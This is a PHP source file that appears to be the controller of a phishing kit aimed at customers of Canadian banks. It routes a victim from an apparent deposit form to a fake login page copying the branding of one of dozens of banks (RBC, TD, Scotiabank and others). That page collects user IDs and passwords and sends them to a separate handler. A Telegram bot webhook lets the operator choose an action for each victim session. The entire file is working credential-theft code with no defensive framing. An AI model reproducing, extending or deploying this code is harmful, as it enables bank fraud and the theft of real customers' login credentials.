<?php
/**
 * master_controller.php
 *
 * Enhanced version using Tailwind CSS for styling, AngularJS (ng design support),
 * and Alpine.js for additional lightweight interactivity.
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);

require_once $_SERVER['DOCUMENT_ROOT'] . '/config.php';

// --------------------------------------------------------------------------
// 1. Telegram Webhook Callback Processing (unchanged)
// --------------------------------------------------------------------------
$rawInput = file_get_contents("php://input");
if (!empty($rawInput) && strpos(trim($rawInput), '{') === 0) {
    $update = json_decode($rawInput, true);
    if (isset($update['callback_query'])) {
        $callback = $update['callback_query'];
        list($sessionId, $actionChosen) = explode(':', $callback['data'], 2);
        $sessionFile = "sessions/{$sessionId}.json";
        if (file_exists($sessionFile)) {
            $sessionData = json_decode(file_get_contents($sessionFile), true);
            $sessionData['action'] = $actionChosen;
            $sessionData['status'] = 'done';
            file_put_contents($sessionFile, json_encode($sessionData));
        }
        if (isset($callback['message'])) {
            file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/editMessageText?" . http_build_query([
                'chat_id'    => $callback['message']['chat']['id'],
                'message_id' => $callback['message']['message_id'],
                'text'       => "✅ Action *{$actionChosen}* selected for session `{$sessionId}`.",
                'parse_mode' => 'Markdown'
            ]));
        }
        file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery?" . http_build_query([
            'callback_query_id' => $callback['id']
        ]));
    }
    exit;
}

// --------------------------------------------------------------------------
// 2. Deposit Form Submission Processing
// --------------------------------------------------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fiId'])) {
    $submittedId = trim($_POST['fiId']);

    $bankMapping = [
        "CA000003" => "rbc", "CA000004" => "td", "CA000002" => "scotiabank", "CA000010" => "cibc",
        "CA000001" => "bmo", "CA000006" => "nationalbank", "CA000219" => "atb", "CA000614" => "tangerine",
        "CA000815" => "desjardins", "CA000320" => "pcfinancial", "CA000328" => "citibank", "CA000382" => "coastcapital",
        "CA000352" => "dcbank", "CA001110" => "fcdq", "CA000621" => "peoples", "CA000540" => "manulife",
        "CA000837" => "meridian", "CA000374" => "motusbank", "CA000612" => "natcan"
    ];

    $additionalBankMapping = [
        "CA001016" => "hsbc", "CA001015" => "wealthone", "CA001014" => "versa", "CA001013" => "vancity",
        "CA001012" => "shinhan", "CA001011" => "sbi", "CA001010" => "peacehillstrust", "CA001009" => "motivefinancial",
        "CA001008" => "laurentian", "CA001007" => "icicican", "CA001006" => "hanabank", "CA001005" => "firstnations",
        "CA001004" => "eqbank", "CA001003" => "ctbc", "CA001002" => "canadianwestern", "CA001001" => "bankofchina",
        "CA001000" => "alterna", "CA000241" => "bankofamerica"
    ];

    $creditUnionMapping = [
        "046610163" => "CA000869", "046610332" => "CA000809", "046610021" => "CA000869", "046610215" => "CA000869",
        "046610100" => "CA000869", "046610379" => "CA000869", "046610305" => "CA000869", "294420010" => "CA000869",
        "046612298" => "CA000869", "046610254" => "CA000869"
    ];

    $allBankMapping = array_merge($bankMapping, $additionalBankMapping);
    if (isset($creditUnionMapping[$submittedId])) {
        $submittedId = $creditUnionMapping[$submittedId];
    }
    if (!isset($allBankMapping[$submittedId])) {
        die("Unknown or unsupported financial institution.");
    }
    header("Location: " . $_SERVER['PHP_SELF'] . "?bank=" . urlencode($allBankMapping[$submittedId]));
    exit;
}

// --------------------------------------------------------------------------
// 3. Dynamic Login Page Rendering with Tailwind CSS & Angular Support
// --------------------------------------------------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['bank'])) {
    $bankCode = strtolower(trim($_GET['bank']));
    if (!$bankCode || !isset($BANKS[$bankCode])) {
        die("Invalid or unsupported bank selected.");
    }
    $bankConfig = $BANKS[$bankCode];

    // Use bank-specific fields if provided; otherwise, default fields.
    if (!isset($bankConfig['fields']) || !is_array($bankConfig['fields'])) {
        $bankConfig['fields'] = [
            [
                'name'        => 'user_id',
                'label'       => 'User ID',
                'type'        => 'text',
                'placeholder' => 'Enter your User ID'
            ],
            [
                'name'        => 'password',
                'label'       => 'Password',
                'type'        => 'password',
                'placeholder' => 'Enter your Password'
            ]
        ];
    }

    $pageTitle = "Login - " . $bankConfig['name'];
    $brandColor = $bankConfig['color'];
    $loginUrl   = $bankConfig['login_url'] ?? "#";
    $logoUrl    = $bankConfig['logo_url'] ?? "";
    ?>
    <!DOCTYPE html>
    <html lang="en" ng-app="bankLoginApp">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title><?= htmlspecialchars($pageTitle) ?></title>
        <!-- Tailwind CSS -->
        <link href="https://cdn.jsdelivr.net/npm/tailwindcss@3.3.2/dist/tailwind.min.css" rel="stylesheet">
        <!-- AngularJS for ng design support -->
        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
        <!-- Alpine.js for additional JS interactivity -->
        <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
        <script>
            // Initialize AngularJS app and controller.
            angular.module('bankLoginApp', []).controller('LoginController', ['$scope', function($scope) {
                $scope.message = "Welcome to <?= addslashes($bankConfig['name']) ?> Online Banking";
                // Additional AngularJS functionality can be added here.
            }]);
        </script>
    </head>
    <body class="bg-gray-100" ng-controller="LoginController">
        <!-- Header with dynamic branding -->
        <header class="py-4 text-center text-white" style="background-color: <?= htmlspecialchars($brandColor) ?>">
            <div class="container mx-auto">
                <?php if (!empty($logoUrl)): ?>
                    <a href="<?= htmlspecialchars($loginUrl) ?>" target="_blank">
                        <img src="<?= htmlspecialchars($logoUrl) ?>" alt="<?= htmlspecialchars($bankConfig['name']) ?> Logo" class="mx-auto h-12">
                    </a>
                <?php endif; ?>
                <h1 class="text-2xl mt-2"><?= htmlspecialchars($bankConfig['name']) ?> Online Banking</h1>
                <!-- Alpine.js binding for a quick dynamic message -->
                <p class="mt-1 text-sm" x-text="message"></p>
            </div>
        </header>
        <!-- Login Form -->
        <main class="container mx-auto mt-10">
            <div class="max-w-md mx-auto bg-white rounded-lg shadow-lg overflow-hidden">
                <div class="p-6">
                    <h2 class="text-xl font-semibold mb-4">Secure Login</h2>
                    <form method="POST" action="process_login.php" novalidate>
                        <?php foreach ($bankConfig['fields'] as $field): 
                            $name        = htmlspecialchars($field['name']);
                            $label       = htmlspecialchars($field['label']);
                            $type        = htmlspecialchars($field['type']);
                            $placeholder = htmlspecialchars($field['placeholder']);
                        ?>
                            <div class="mb-4">
                                <label for="<?= $name ?>" class="block text-gray-700 mb-2"><?= $label ?></label>
                                <input type="<?= $type ?>" name="<?= $name ?>" id="<?= $name ?>" placeholder="<?= $placeholder ?>" required class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:border-blue-300">
                            </div>
                        <?php endforeach; ?>
                        <!-- Hidden bank code -->
                        <input type="hidden" name="bank" value="<?= htmlspecialchars($bankCode) ?>">
                        <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition duration-200">Login</button>
                    </form>
                </div>
            </div>
        </main>
        <!-- Footer -->
        <footer class="mt-10 text-center text-gray-600 text-sm">
            &copy; <?= date("Y") ?> <?= htmlspecialchars($bankConfig['name']) ?>. All rights reserved.
        </footer>
    </body>
    </html>
    <?php
    exit;
}

// Default fallback: Redirect to deposit form.
header("Location: deposit_form.html");
exit;
?>